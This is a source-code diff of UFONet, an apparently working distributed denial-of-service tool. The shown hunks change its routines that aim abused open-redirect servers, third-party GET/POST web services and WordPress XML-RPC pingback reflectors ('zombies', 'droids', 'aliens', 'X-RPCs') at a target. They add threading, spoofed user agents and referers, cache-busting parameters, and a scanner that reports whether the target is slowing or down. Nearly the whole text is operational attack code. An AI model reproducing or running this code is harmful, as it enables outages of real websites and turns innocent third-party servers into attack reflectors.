+                print "[Info] [UCAVs] " + name_ucav + " -> FAILED (cannot connect!)"
+                if not self.options.disablepurge:
+                    self.discard_ucavs.append(ucav)
+                    self.num_discard_ucavs = self.num_discard_ucavs + 1
                 self.ucavs_fail = self.ucavs_fail + 1 # add ucav fail to stats
                 target_reply = ""
-            if target_reply == "":
+            if target_reply == "": # check for target's status resolved by [UCAVs]
                 pass
             else:
                 if not "is down" or not "looks down" in target_reply: # parse external service for reply
-                    print "[Info] UCAV: " + ucav + " -> HIT! || Report: ONLINE! [Keep shooting!]"
-                    num_is_up = num_is_up + 1 
+                    print "[Info] [UCAVs] " + name_ucav + " -> Target is ONLINE! -> [Keep shooting!]"
+                    self.num_is_up = self.num_is_up + 1 
                 else:
-                    print "[Info] UCAV: " + ucav + " -> FAILED? || Report: Target looks OFFLINE from here!!! ;-)"
-                    num_is_down = num_is_down + 1
-        if num_is_down > 0 and num_is_up == 0: # check for: 1 or more down, 0 up
-            print "\n[Info] Congratulations!. Your target looks OFFLINE from external sources...\n"
-            if not self.options.forceyes:
-                update_reply = raw_input("Want to send a [HEAD] check request from your proxy? (y/N)")
-                print "\n" + '-'*25
-            else:
-                update_reply = "N"
-            if update_reply == "y" or update_reply == "Y":
-                try: # send HEAD connection
-                    self.head = True
-                    reply = self.connect_zombie(target)
-                    self.head = False
-                    if reply:
-                        print "\n[Info] Wow! Target is replying you... [Keep shooting!]\n"
-                    else:
-                        print "\n[Info] #UFONet TANGO DOWN!!! ;_) -> " +target + "\n"
-                        self.update_targets_crashed() # update targets crashed stats
-                        self.update_mothership_stats() # update mothership completed attack stats
-                        if self.options.web:
-                            return 
-                        else:
-                            sys.exit(2) # Debug traceback (without crash) for celebrate it! ;-)
-                except Exception:
-                    print "\n[Error] Something wrong with your connection!\n"
-                    if self.options.verbose:
-                        traceback.print_exc()
-                return #sys.exit(2)
-            else:
-                print "\n[Info] #UFONet TANGO DOWN!!! ;_) -> " +target + "\n"
-                self.update_targets_crashed() # update targets crashed stats
-                self.update_mothership_stats() # update mothership completed attack stats
-                if self.options.web:
-                    return 
-                else:
-                    sys.exit(2) # Debug traceback (without crash...) for celebrate it! ;-)
+                    print "[Info] [UCAVs] " + name_ucav + " -> Target looks OFFLINE! -> [Checking!]"
+                    self.num_is_down = self.num_is_down + 1
+            if self.options.verbose:
+                print "[Info] [AI] [UCAVs] "+str(name_ucav)+" is returning..."
+        self.extra_zombies_lock = False # [ARMY] have finished
 
     def extract_median(self, num_list):
         # extract median form a list of numbers
@@ -2175,7 +2541,7 @@ class UFONet(object):
         self.start = None
         self.stop = None
         print '\n---------'
-        print "\n[Info] Scanning target to check for levels on defensive shields...\n"
+        print "\n[Info] [AI] Scanning target to check for levels on defensive shields...\n"
         if target.endswith(""):
             target.replace("", "/")
         self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
@@ -2184,17 +2550,21 @@ class UFONet(object):
             req = urllib2.Request(target, None, headers)
             if self.options.proxy: # set proxy
                 self.proxy_transport(self.options.proxy)
-                self.start = time.time()
-                target_reply = urllib2.urlopen(req).read()
-                header = urllib2.urlopen(req).info()
-                self.stop = time.time()
+            if self.options.timeout: # set timeout
+                try:
+                    timeout = int(self.options.timeout)
+                except:
+                    timeout = 1 
             else:
-                self.start = time.time()
-                target_reply = urllib2.urlopen(req, context=self.ctx).read()
-                header = urllib2.urlopen(req).info()
-                self.stop = time.time()
+                timeout = 1 
+            if timeout < 1:
+                timeout = 1 
+            self.start = time.time()
+            target_reply = urllib2.urlopen(req, context=self.ctx, timeout=timeout).read()
+            header = urllib2.urlopen(req, context=self.ctx).info()
+            self.stop = time.time()
         except:
-            print('[Error] Our scanner can not connect to the target this round... Skipping!\n')
+            print('[Info] [AI] Our scanner cannot connect to the target this round! -> [Skipping!]\n')
             return 
         try:
             s, size_name = self.convert_size(len(target_reply))
@@ -2280,11 +2650,11 @@ class UFONet(object):
                 else:
                     print "\n"
             if self.loadcheck_prev_load < load: # target is loading more slowly
-                print "[Info] SCANNER: Your target is serving content more slowly this round... [Keep shooting!]\n"
+                print "[Info] [Scanner] Target is serving the content more slowly this round! ;-) -> [Keep shooting!]\n"
             elif self.loadcheck_prev_load == load: # inmutable target
-                print "[Info] SCANNER: Your attack is not having any effect on you target this round...\n"
+                print "[Info] [Scanner] Attack is not having any effect on your target this round... -> [Keep shooting!]\n"
             elif self.loadcheck_prev_load > load: # is target defending?
-                print "[Info] SCANNER: Your target is loading this round faster than the previous one... o_0\n"
+                print "[Info] [Scanner] Target is loading this round faster than the previous one! -> [o_0]\n"
         else:
             print '   -Bytes in (this round) :', size
             print '   -Load time (this round):', load, "seconds\n"
@@ -2311,13 +2681,102 @@ class UFONet(object):
     def convert_time(self, time):
         return '%.2f' % time
 
-    def send_aliens(self, target):
-        # extract external web abuse services urls (POST) and perform requests against target
+    def discarding_zombies(self, zombie, zombies):
+        if zombie in self.discardzombies:
+            zombies.remove(zombie)
+            if self.options.verbose:
+                print("[Info] [AI] [Control] [Zombies] "+str(zombie)+" is not working! -> [Discarding!]")
+        return zombies
+
+    def send_zombies(self, zombies):
+        # send Open Redirect zombies
+        time.sleep(1) # aiming (multi-threading flow time compensation)
+        if not self.options.disablepurge:
+            if not zombies:
+                self.empty_zombies = True
+                return
+        if self.options.verbose:
+            print "[Info] [AI] [Control] Deploying [Zombies] with 'maser-melee' weapons..."
         options = self.options
-        print "\n[Info] Deploying heavy alien troops with 'laser-cannon' weapons...\n"
-        aliens = self.extract_aliens() # extract aliens from file
-        self.total_aliens = len(aliens) # add total of aliens to stats
+        target = self.options.target
+        shuffle(zombies) # shuffle zombies order, each round :-)
+        if not self.options.disablepurge:
+            for zombie in zombies: # check if zombie is failing for autobalance army
+                if not zombie.startswith('http'): # discarded inmediately
+                    self.discardzombies.append(zombie)
+                    self.num_discard_zombies = self.num_discard_zombies + 1
+                zombies = self.discarding_zombies(zombie, zombies)
+        if not self.options.disablepurge:
+            if not zombies: # return when not any working
+                self.empty_zombies = True
+                return
+        for zombie in zombies:
+            t = urlparse(zombie)
+            name_zombie = t.netloc
+            if name_zombie == "":
+                name_zombie = zombie
+            if not self.options.attackme:
+                print "[Info] [Zombies] Attacking from: " + name_zombie
+            else: # on attackme, target url is dynamic -> http://public_ip:port/hash|zombie
+                self.mothership_hash = random.getrandbits(128) # generating random evasion hash  
+                target = "http://" + str(self.pub_ip) + ":" + self.port + "/"+ str(self.mothership_hash) + "|" + zombie
+                self.options.target = target
+                print "[Info] [Zombies] Attacking: " + str(self.pub_ip) + ":" + self.port + " -> [LAN]" + self.local_ip + ":" + self.port
+                print "[Info] [Zombies] Payload: " + target
+                print '='*55, "\n"
+            self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
+            if not options.target.startswith('http'):
+                if options.forcessl:
+                    options.target = "https://" + options.target
+                else:
+                    options.target = "http://" + options.target
+            self.attack_mode = True
+            try:
+                if options.verbose:
+                    print "[Info] [Zombies] Sniping: " + options.target
+                self.connect_zombies(zombie)
+                if self.options.dbstress: # try to stress db on target by using vulnerable Open Redirect web servers
+                    self.db_flash = self.db_flash + 1
+                    stress = self.stressing(target, zombie)
+            except Exception:
+                print "[Info] [Zombies] " + zombie + " -> FAILED (cannot connect!)"
+                self.total_zombies_failed_connection = self.total_zombies_failed_connection + 1 # used to manage threading pool
+                if not self.options.disablepurge:
+                    self.discardzombies.append(zombie)
+                    self.num_discard_zombies = self.num_discard_zombies + 1
+            if self.options.verbose:
+                print "[Info] [AI] [Zombies] "+str(name_zombie)+" is returning..."
+            self.attack_mode = False
+
+    def discarding_aliens(self, alien, aliens):
+        if alien in self.discard_aliens:
+            aliens.remove(alien)
+            if self.options.verbose:
+                print("[Info] [AI] [Control] [Aliens] "+str(alien)+" is not working! -> [Discarding!]")
+            self.aliens_fail = self.aliens_fail + 1 # add fail to aliens stats
+        return aliens
+
+    def send_aliens(self, aliens):
+        # extract external web abuse services urls (POST) and perform requests against target
+        time.sleep(2) # aiming (multi-threading flow time compensation)
+        if not self.options.disablepurge:
+            if not aliens: # return when not any working
+                self.options.disablealiens = True
+                return
+        target = self.options.target
+        options = self.options
         shuffle(aliens) # shuffle aliens 
+        if not self.options.disablepurge:
+            for alien in aliens:
+                if not alien.startswith('http'): # discarded inmediately
+                    self.discard_aliens.append(alien)
+                    self.num_discard_aliens = self.num_discard_aliens + 1
+                aliens = self.discarding_aliens(alien, aliens) # check if alien is failing for autobalance army
+        if not self.options.disablepurge:
+            if not aliens: # return when not any working
+                self.options.disablealiens = True
+                return
+        shuffle(aliens) # shuffle aliens order, each discarding check :-)
         for alien in aliens:
             if "$POST" in alien: # extract alien/parameters -> search for $POST delimiter on 'aliens.txt' file
                 regex_alien = re.compile('{}(.*){}'.format(re.escape(''), re.escape(';$POST'))) # regex magics
@@ -2328,20 +2787,47 @@ class UFONet(object):
                 param = re.findall(pattern_param, alien) # HTTP POST params to submit
                 for u in alien_url:
                     url = u # ex: POST -> path/submit.php
-                print "[Info] Firing from: " + url
+                t = urlparse(url)
+                name_alien = t.netloc
+                if name_alien == "":
+                    name_alien = alien
+                print "[Info] [Aliens] Attacking from: " + name_alien
                 for p in param:
                     param_target = {p : target} # ex POST -> url=target
                     param_target = urllib.urlencode(param_target)
                 try:
                     if options.verbose:
-                        print "[Info] Sniping: " + url + " - POST:", param_target
+                        print "[Info] [Aliens] Sniping: " + url + " - POST:", param_target
+                    if options.proxy: # set proxy
+                        self.proxy_transport(options.proxy)
+                    if self.options.timeout: # set timeout
+                        try:
+                            alien_timeout = int(self.options.timeout)
+                        except:
+                            alien_timeout = 1 
+                    else:
+                        alien_timeout = 1 
+                    if alien_timeout < 1:
+                        alien_timeout = 1 
                     req = urllib2.Request(url, param_target)
-                    rsp = urllib2.urlopen(req)
-                    #content = rsp.read()
+                    rsp = urllib2.urlopen(req, context=self.ctx, timeout=alien_timeout)
                     self.aliens_hit = self.aliens_hit + 1 # add hit to aliens stats
                 except Exception:
-                    print "[Error] Alien: " + alien + " -> FAILED (cannot connect!)"
+                    print "[Info] [Aliens] " + name_alien + " -> FAILED (cannot connect!)"
                     self.aliens_fail = self.aliens_fail + 1 # add fail to aliens stats
+                    if not self.options.disablepurge:
+                        self.discard_aliens.append(alien)
+                        self.num_discard_aliens = self.num_discard_aliens + 1
+            else:
+                print("[Info] [Aliens] "+str(alien)+" -> FAILED (invalid alien!)")
+                self.aliens_fail = self.aliens_fail + 1 # add fail to aliens stats
+                if not self.options.disablepurge:
+                    self.discard_aliens.append(alien)
+                    self.num_discard_aliens = self.num_discard_aliens + 1
+            if self.options.verbose:
+                print "[Info] [AI] [Aliens] "+str(name_alien)+" is returning..."
+        if self.options.disabledroids and self.options.disablerpcs and self.options.disableucavs:
+            self.extra_zombies_lock = False # [ARMY] have finished
 
     def extract_aliens(self):
         # extract aliens from file
@@ -2352,43 +2838,94 @@ class UFONet(object):
             aliens = [ alien.replace('\n','') for alien in aliens ]
             f.close()
             if not aliens:
-                print "\n[Error] - Imposible to retrieve 'aliens' from file.\n"
+                print "[Info] [AI] [Control] Cannot retrieve [Aliens] from: 'botnet/aliens.txt' -> [Discarding!]"
+                self.options.disablealiens = True
                 return
             else:
                 return aliens
         except:
             if os.path.exists(self.aliens_file) == True:
-                print '\n[Error] - Cannot open:', 'aliens.txt', "\n"
+                print "[Info] [AI] [Control] Cannot open [Aliens] from: 'botnet/aliens.txt' -> [Discarding!]"
                 return #sys.exit(2)
             else:
-                print '\n[Error] - Cannot found:', 'aliens.txt', "\n"
+                print "[Info] [AI] [Control] Cannot found [Aliens] from: 'botnet/aliens.txt' -> [Discarding!]"
                 return #sys.exit(2)
 
-    def send_droids(self, target):
+    def discarding_droids(self, droid, droids):
+        if droid in self.discard_droids:
+            droids.remove(droid)
+            if self.options.verbose:
+                print("[Info] [AI] [Control] [Droids] "+str(droid)+" is not working! -> [Discarding!]")
+            self.droids_fail = self.droids_fail + 1 # add fail to droids stats
+        return droids
+
+    def send_droids(self, droids):
         # extract external web abuse services urls (GET) and perform requests against target
-        options = self.options
-        print "\n[Info] Deploying droids with 'light-laser' weapons...\n"
-        droids = self.extract_droids() # extract droids from file
-        self.total_droids = len(droids) # add total of droids to stats
-        shuffle(droids) # shuffle droids
+        time.sleep(3) # aiming (multi-threading flow time compensation)
+        if not self.options.disablepurge:
+            if not droids: # return when not any working
+                self.options.disabledroids = True
+                return
+        target = self.options.target
         target = urllib.unquote(target).decode('utf8') # parte urlencoding
         if target.startswith('http://'): # remove http
             target = target.replace('http://', '')
         if target.startswith('https://'):
             target = target.replace('https://', '') # remove https
+        options = self.options
+        shuffle(droids) # shuffle droids
+        if not self.options.disablepurge:
+            for droid in droids:
+                if not droid.startswith('http'): # discarded inmediately
+                    self.discard_droids.append(droid)
+                    self.num_discard_droids = self.num_discard_droids + 1
+                droids = self.discarding_droids(droid, droids) # check if droid is failing for autobalance army
+        if not self.options.disablepurge:
+            if not droids: # return when not any working
+                self.options.disabledroids = True
+                return
+        shuffle(droids) # shuffle droids order, each discarding check :-)
         for droid in droids:
             if "$TARGET" in droid: # replace droid/parameter for target
                 url = droid.replace("$TARGET", target)
-                print "[Info] Firing from: " + url
+                t = urlparse(url)
+                name_droid = t.netloc
+                if name_droid == "":
+                    name_droid = droid
+                print "[Info] [Droids] Attacking from: " + name_droid
                 self.user_agent = random.choice(self.agents).strip() # shuffle user-agent 
                 headers = {'User-Agent' : self.user_agent, 'Content-type' : "application/x-www-form-urlencoded", 'Referer' : self.referer, 'Connection' : 'keep-alive'} # set fake headers
                 try:
+                    if options.proxy: # set proxy
+                        self.proxy_transport(options.proxy)
+                    if self.options.timeout: # set timeout
+                        try:
+                            droid_timeout = int(self.options.timeout)
+                        except:
+                            droid_timeout = 1 
+                    else:
+                        droid_timeout = 1 
+                    if droid_timeout < 1:
+                        droid_timeout = 1 
                     req = urllib2.Request(url, None, headers)
-                    rsp = urllib2.urlopen(req)
+                    rsp = urllib2.urlopen(req, context=self.ctx, timeout=droid_timeout)
                     self.droids_hit = self.droids_hit + 1 # add hit to droids stats
                 except Exception:
-                    print "[Error] Droid: " + url + " -> FAILED (cannot connect!)"
+                    print "[Info] [Droids] " + name_droid + " -> FAILED (cannot connect!)"
                     self.droids_fail = self.droids_fail + 1 # add fail to droids stats
+                    if not self.options.disablepurge:
+                        self.discard_droids.append(droid)
+                        self.num_discard_droids = self.num_discard_droids + 1
+            else:
+                print "[Info] [Droids] " + str(droid) + " -> FAILED (invalid droid!)"
+                self.droids_fail = self.droids_fail + 1 # add fail to droids stats
+                if not self.options.disablepurge:
+                    self.discard_droids.append(droid)
+                    self.num_discard_droids = self.num_discard_droids + 1
+            if self.options.verbose:
+                print "[Info] [AI] [Droids] "+str(name_droid)+" is returning..."
+        if self.options.disablerpcs and self.options.disableucavs:
+            self.extra_zombies_lock = False # [ARMY] have finished
 
     def extract_droids(self):
         # extract droids from file
@@ -2399,31 +2936,60 @@ class UFONet(object):
             droids = [ droid.replace('\n','') for droid in droids ]
             f.close()
             if not droids:
-                print "\n[Error] - Imposible to retrieve 'droids' from file.\n"
+                print "[Info] [AI] [Control] Cannot retrieve [Droids] from: 'botnet/droids.txt' -> [Discarding!]"
+                self.options.disabledroids = True
                 return
             else:
                 return droids
         except:
             if os.path.exists(self.droids_file) == True:
-                print '\n[Error] - Cannot open:', 'droids.txt', "\n"
+                print "[Info] [AI] [Control] Cannot open [Droids] from: 'botnet/droids.txt' -> [Discarding!]"
                 return #sys.exit(2)
             else:
-                print '\n[Error] - Cannot found:', 'droids.txt', "\n"
+                print "[Info] [AI] [Control] Cannot found [Droids] from: 'botnet/droids.txt' -> [Discarding!]"
                 return #sys.exit(2)
 
-    def send_rpcs(self, target):
+    def discarding_rpcs(self, rpc, rpcs):
+        if rpc in self.discard_rpcs:
+            rpcs.remove(rpc)
+            if self.options.verbose:
+                print("[Info] [AI] [Control] [X-RPCs] "+str(rpc)+" is not working! -> [Discarding!]")
+        return rpcs
+
+    def send_rpcs(self, rpcs):
         # extract vulnerable XML-RPC pingback services and perform requests against target
-        print "\n[Info] Aiming 'plasma' cannon reflector turrets...\n"
-        rpcs = self.extract_rpcs() # extract rpcs from file
-        self.total_rpcs = len(rpcs) # add total rpcs to stats
-        shuffle(rpcs) # shuffle rpcs
+        time.sleep(4) # aiming (multi-threading flow time compensation)
+        if not self.options.disablepurge:
+            if not rpcs: # return when not any working
+                self.options.disablerpcs = True
+                return
+        target = self.options.target
+        options = self.options
         def random_key(length):
             key = ''
             for i in range(length):
                 key += random.choice(string.lowercase + string.uppercase + string.digits)
             return key
+        shuffle(rpcs) # shuffle rpcs
+        if not self.options.disablepurge:
+            for rpc in rpcs:
+                if not rpc.startswith('http'): # discarded inmediately
+                    if not self.options.disablepurge:
+                        self.discard_rpcs.append(rpc)
+                        self.num_discard_rpcs = self.num_discard_rpcs + 1
+                    self.rpcs_fail = self.rpcs_fail + 1 # add rpc fail to stats
+                rpcs = self.discarding_rpcs(rpc, rpcs) # check if rpc is failing for autobalance army
+        if not self.options.disablepurge:
+            if not rpcs: # return when not any working
+                self.options.disablerpcs = True
+                return
+        shuffle(rpcs) # shuffle rpcs order, each discarding check :-)
         for rpc in rpcs:
-            print "[Info] Firing from: " + rpc
+            t = urlparse(rpc)
+            name_rpc = t.netloc
+            if name_rpc == "":
+                name_rpc = rpc
+            print "[Info] [X-RPCs] Attacking from: " + name_rpc
             self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
             headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
             key = random_key(8) # generate random value page to bypass cache
@@ -2433,16 +2999,40 @@ class UFONet(object):
             target_place = target + rpc_page + rpc_id # random place to bypass cache (ex: www.target.com?U7OvBdp1=4lMcNj)
             if "/xmlrpc.php" in rpc:
                 rpc_place = rpc.replace("xmlrpc.php", "")
-            rpc_exploit = "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>"+target_place+"</string></value></param><param><value><string>"+rpc_place+"</string></value></param></params></methodCall>"
-            try:
-                req = urllib2.Request(rpc, rpc_exploit, headers)
-                target_reply = urllib2.urlopen(req, context=self.ctx).read()
-                self.rpcs_hit = self.rpcs_hit + 1 # add rpc hit to stats
-                if self.options.verbose:
-                    print "Reply:", target_reply
-            except:
-                print "[Error] X-RPC: " + rpc + " -> FAILED (cannot connect!)"
+                rpc_exploit = "<methodCall><methodName>pingback.ping</methodName><params><param><value><string>"+target_place+"</string></value></param><param><value><string>"+rpc_place+"</string></value></param></params></methodCall>"
+                try:
+                    if options.proxy: # set proxy
+                        self.proxy_transport(options.proxy)
+                    if self.options.timeout: # set timeout
+                        try:
+                            rpc_timeout = int(self.options.timeout)
+                        except:
+                            rpc_timeout = 1 
+                    else:
+                        rpc_timeout = 1 
+                    if rpc_timeout < 1:
+                        rpc_timeout = 1 
+                    req = urllib2.Request(rpc, rpc_exploit, headers)
+                    urllib2.urlopen(req, context=self.ctx, timeout=rpc_timeout)
+                    self.rpcs_hit = self.rpcs_hit + 1 # add rpc hit to stats
+                    if self.options.verbose:
+                        print "[Info] [X-RPCs] Reply:", target_reply
+                except:
+                    print "[Info] [X-RPCs] " + name_rpc + " -> FAILED (cannot connect!)"
+                    self.rpcs_fail = self.rpcs_fail + 1 # add rpc fail to stats
+                    if not self.options.disablepurge:
+                        self.discard_rpcs.append(rpc)
+                        self.num_discard_rpcs = self.num_discard_rpcs + 1
+            else:
+                print "[Info] [X-RPCs] " + name_rpc + " -> FAILED (invalid X-RPC!)"
                 self.rpcs_fail = self.rpcs_fail + 1 # add rpc fail to stats
+                if not self.options.disablepurge:
+                    self.discard_rpcs.append(rpc)
+                    self.num_discard_rpcs = self.num_discard_rpcs + 1
+            if self.options.verbose:
+                print "[Info] [AI] [X-RPCs] "+str(name_rpc)+" is returning..."
+        if self.options.disableucavs:
+            self.extra_zombies_lock = False # [ARMY] have finished
 
     def extract_rpcs(self):
         # extract rpcs from file
@@ -2454,20 +3044,20 @@ class UFONet(object):
             rpcs = [ rpc.replace('\n','') for rpc in rpcs ]
             f.close()
             if not rpcs:
-                print "\n[Error] - Imposible to retrieve 'rpcs' from file.\n"
+                print "[Info] [AI] [Control] Cannot retrieve [X-RPCs] from: 'botnet/rpcs.txt' -> [Discarding!]"
+                self.options.disablerpcs = True
                 return
             else:
                 return rpcs
         except:
             if os.path.exists(self.rpcs_file) == True:
-                print '\n[Error] - Cannot open:', 'rpcs.txt', "\n"
-                return #sys.exit(2)
+                print "[Info] [AI] [Control] Cannot open [X-RPCs] from: 'botnet/rpcs.txt' -> [Discarding!]"
+                return
             else:
-                print '\n[Error] - Cannot found:', 'rpcs.txt', "\n"
-                return #sys.exit(2)
+                print "[Info] [AI] [Control] Cannot found [X-RPCs] from: 'botnet/rpcs.txt' [Discarding!]"
+                return
 
     def extract_zombies(self):
-        # extract targets from file
         options = self.options
         if self.options.test:
             try:
@@ -2476,16 +3066,16 @@ class UFONet(object):
                 zombies = [ zombie.replace('\n','') for zombie in zombies ]
                 f.close()
                 if not zombies:
-                    print "\n[Error] - Imposible to extract 'zombies' from file "+options.test+".\n"
+                    print "\n[Error] [AI] [Control] Cannot retrieve [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n"
                     return
                 else:
                     return zombies
             except:
                 if os.path.exists(options.test) == True:
-                    print '\n[Error] - Cannot open:', options.test, "\n"
+                    print "\n[Error [AI] [Control] Cannot open [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n"
                     return #sys.exit(2)
                 else:
-                    print '\n[Error] - Cannot found:', options.test, "\n"
+                    print "\n[Error] [AI] [Control] Cannot found [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n"
                     return #sys.exit(2)
         else:
             try:
@@ -2494,17 +3084,37 @@ class UFONet(object):
                 zombies = [ zombie.replace('\n','') for zombie in zombies ]
                 f.close()
                 if not zombies:
-                    print "\n[Error] - Imposible to retrieve 'zombies' from file.\n"
+                    print "\n[Error] [AI] You haven't [Zombies] to be extracted from: 'botnet/zombies.txt' -> [Aborting!]\n"
                     return
                 else:
                     return zombies
             except:
                 if os.path.exists(self.zombies_file) == True:
-                    print '\n[Error] - Cannot open:', 'zombies.txt', "\n"
+                    print "\n[Error] [AI] [Control] Cannot open [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n"
                     return #sys.exit(2)
                 else:
-                    print '\n[Error] - Cannot found:', 'zombies.txt', "\n"
+                    print "\n[Error] [AI] [Control] Cannot found [Zombies] from: 'botnet/zombies.txt' -> [Aborting!]\n"
                     return #sys.exit(2)
+
+    def extract_target_list(self):
+        options = self.options
+        try:
+            f = open(options.target_list)
+            targets = f.readlines()
+            targets = [ target.replace('\n','') for target in targets ]
+            f.close()
+            if not targets:
+                print "\n[Error] [AI] [Control] Cannot retrieve [Targets] from: '"+options.target_list+"' -> [Aborting!]\n"
+                return
+            else:
+                return targets
+        except:
+            if os.path.exists(options.target_list) == True:
+                print "\n[Error] [AI] [Control] Cannot found [Targets] from: '"+options.target_list+"' -> [Aborting!]\n"
+                return #sys.exit(2)
+            else:
+                print "\n[Error] [AI] [Control] Cannot open [Targets] from: '"+options.target_list+"' -> [Aborting!]\n"
+                return #sys.exit(2)
 
     def update_zombies(self, zombies_ready):
         # update zombies on file
@@ -2593,14 +3203,17 @@ class UFONet(object):
             f.close()
 
     def search_rpc(self, rpc_host):
+        options = self.options
         rpc_vulnerable = False
         rpc_pingback_url = False
         self.user_agent = random.choice(self.agents).strip() # shuffle user-agent
         headers = {'User-Agent' : self.user_agent, 'Referer' : self.referer} # set fake user-agent and referer
         try:
             if self.options.testall: # testing_all
+                if options.proxy: # set proxy
+                    self.proxy_transport(options.proxy)
                 req = urllib2.Request(rpc_host, None, headers)
-                rpc_code = urllib2.urlopen(req).read()
+                rpc_code = urllib2.urlopen(req, context=self.ctx).read()
                 rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
                 for link in rpc_links:
                     if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
@@ -2625,9 +3238,11 @@ class UFONet(object):
                     rpc_pingback_url = m.group(1) # extract rpc server url
                     rpc_vulnerable = True
                 else: # not X-Pingback on HTTP Headers (search for <link rel="pingback"... on HTML/XHTML code)
+                    if options.proxy: # set proxy
+                        self.proxy_transport(options.proxy)
                     req_rpc = urllib2.Request(rpc_host, None, headers)
                     req_rpc.get_method = lambda : 'GET'
-                    rpc_code = urllib2.urlopen(req_rpc).read()
+                    rpc_code = urllib2.urlopen(req_rpc, context=self.ctx).read()
                     rpc_links = re.findall('"((http|ftp)s?://.*?)"', rpc_code)
                     for link in rpc_links:
                         if 'xmlrpc.php' in link[0] and not "rsd" in link[0]: # extract rpc server url (discarding 'rsd' url)
@@ -2643,7 +3258,7 @@ class UFONet(object):
 
     def testing_offline(self):
         # check for zombies offline
-        print ("\nChecking for 'zombies' offline!\n")
+        print ("\nChecking for [Zombies] offline!\n")
         print '='*35
         zombies_online = 0
         zombies_offline = 0
@@ -2674,7 +3289,9 @@ class UFONet(object):
                 zombie_type = 'UCAV'
             t = urlparse(zombie)
             name_zombie = t.netloc
-            if zombie_type == 'Alien': # 'Aliens' are made with keyword ;$POST;
+            if name_zombie == "":
+                name_zombie = zombie
+            if zombie_type == 'Alien': # [Aliens] are made with keyword ;$POST;
                 sep = ';$POST;'
                 zombie = zombie.split(sep, 1)[0]
             reply = str(self.connect_zombie(zombie))
@@ -2702,26 +3319,127 @@ class UFONet(object):
         self.head = False
         if zombies_offline > 0:
             if not self.options.forceyes:
-                test_reply = raw_input("Want to update your army? (Y/n)\n")
+                test_reply = raw_input("[AI] Do you want to update your army? (Y/n)\n")
                 print '-'*25 + "\n"
             else:
                 test_reply = "Y"
             if test_reply == "n" or test_reply == "N":
-                print "Bye!\n"
+                print "[AI] "+self.exit_msg+"\n"
                 return
             else:
-                disc_zombies = self.discard_zombies(discarded) # discard zombies from botnet (remove from files)
+                disc_zombies = self.discard_zombies(discarded) # discard zombies (remove from files)
                 print '='*52
                 print "\n  - DISCARDED:", disc_zombies
                 new_botnet = int(len(botnet) - disc_zombies)
                 print "\n+ New Total Botnet:", str(new_botnet), "\n"
                 print '='*52 + '\n'
         else:
-            print "[Info] ALL checked 'zombies' are ONLINE... Exiting!\n"
+            print "[Info] [AI] [Control] ALL checked [Zombies] are ONLINE! -> [Exiting!]\n"
+
+    def send_extra_zombies(self):
+        # check for extra zombies: aliens, droids, rpcs, ucavs... and start attacking with them
+        if not self.options.disablealiens and not self.options.attackme: # different layers requests -> pure web abuse
+            if self.options.verbose:
+                print "[Info] [AI] [Control] Deploying [Aliens] with heavy 'laser-cannon' weapons..."
+            aliens = [self.extract_aliens()] # extract aliens from file to a list
+            for a in aliens:
+                if a is None:
+                    self.options.disablealiens = True
+                    self.total_aliens = 0 # not any alien invoked
+                else:
+                    for s in a: # extract number of aliens
+                        self.total_aliens = self.total_aliens + 1
+            al = threading.Thread(target=self.send_aliens, args=(aliens)) # multithreading to send aliens
+            al.start()
+        else:
+            self.options.disablealiens = True
+            self.total_aliens = 0 # not any alien invoked
+        if not self.options.disabledroids and not self.options.attackme: # GET (with parameter required) requests
+            if self.options.verbose:
+                print "[Info] [AI] [Control] Deploying [Droids] with light 'laser-cannon' weapons..."
+            droids = [self.extract_droids()] # extract droids from file to a list
+            for d in droids:
+                if d is None:
+                    self.options.disabledroids = True
+                    self.total_droids = 0 # not any droid invoked
+                else:
+                    for s in d: # extract number of droids
+                        self.total_droids = self.total_droids + 1
+            dr = threading.Thread(target=self.send_droids, args=(droids)) # multithreading to send droids
+            dr.start()
+        else:
+            self.options.disabledroids = True
+            self.total_droids = 0 # not any droid invoked
+        if not self.options.disablerpcs and not self.options.attackme: # exploit XML-RPC pingback vulnerability
+            if self.options.verbose:
+                print "[Info] [AI] [Control] Deploying [X-RPCs] with 'plasma cannon' weapons..."
+            rpcs = [self.extract_rpcs()] # extract rpcs from file to a list
+            for r in rpcs:
+                if r is None:
+                    self.options.disablerpcs = True
+                    self.total_rpcs = 0 # not any rpc invoked
+                else:
+                    for s in r: # extract number of rpcs
+                        self.total_rpcs = self.total_rpcs + 1
+            rp = threading.Thread(target=self.send_rpcs, args=(rpcs)) # multithreading to send rpcs
+            rp.start()
+        else:
+            self.options.disablerpcs = True
+            self.total_rpcs = 0 # not any rpcs invoked
+        if not self.options.disableucavs and not self.options.attackme: # perform an external 'Is target up?' round check
+            if self.options.verbose:
+                print "[Info] [AI] [Control] Deploying [UCAVs] with 'heat-beam' weapons and 'status check' scanners..." 
+            ucavs = [self.extract_ucavs()] # extract ucavs from file to a list
+            for u in ucavs:
+                if u is None:
+                    self.options.disableucavs = True
+                    self.total_ucavs = 0 # not any ucav invoked
+                else:
+                    for s in u: # extract number of ucavs
+                        self.total_ucavs = self.total_ucavs + 1
+            uc = threading.Thread(target=self.send_ucavs, args=(ucavs)) # multithreading to send ucavs
+            uc.start()
+        else:
+            self.options.disableucavs = True
+            self.total_ucavs = 0 # not any ucavs invoked
+
+    def abandoning_zombies(self):
+        if self.options.expire: # set timing for purge
+            try:
+                timing = int(self.options.expire)
+            except:
+                timing = self.expire_timing # default timing for purge
+        else:
+            timing = self.expire_timing # default timing for purge
+        if timing < 1:
+            timing = self.expire_timing # default timing for purge
+        zombies_arrival_timing = timing # timing = trying to control round time for threading flow
+        zombies_lock = 0
+        if self.options.verbose:
+            print "[Info] [AI] [Control] Setting ["+str(zombies_arrival_timing)+"] per round for [Zombies] to return..."
+        while self.herd.no_more_zombies() == False: # abandoning -controller- zombies
+            zombies_lock = zombies_lock + 1
+            if zombies_lock > zombies_arrival_timing: # execute main abandoning routine!
+                if self.options.verbose:
